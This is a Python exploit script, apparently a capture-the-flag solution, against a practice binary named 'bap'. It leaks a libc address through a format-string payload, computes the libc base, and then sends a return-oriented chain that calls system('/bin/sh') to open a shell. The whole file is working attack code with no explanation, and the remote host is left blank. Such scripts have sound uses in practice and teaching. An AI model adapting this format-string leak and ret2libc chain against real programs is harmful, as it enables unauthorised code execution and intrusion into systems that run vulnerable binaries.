#!/usr/bin/python3
from pwncus import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./bap_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+69
b*main+81
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

'''
[*] '/home/alter/pwn/Practice/bap/bap'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
ret = 0x000000000040101a
pop_rdi = 0x000000000002a3e5

pl = b'%11$s' + b'A' * 19
pl += p64(ret) + p64(exe.sym.main) + p64(exe.got.gets)
sla(b': ',pl)

leak = u64(ru(b'A')[:-1] + b'\0\0')
libc.address = leak - libc.sym.gets
info('Leak: ' + hex(leak))
info('Libc base: ' + hex(libc.address))

pl = b'B'*24 
pl += p64(ret)
pl += p64(libc.address + pop_rdi) + p64(next(libc.search(b'/bin/sh')))
pl += p64(libc.sym.system)
sla(b': ',pl)

interactive()
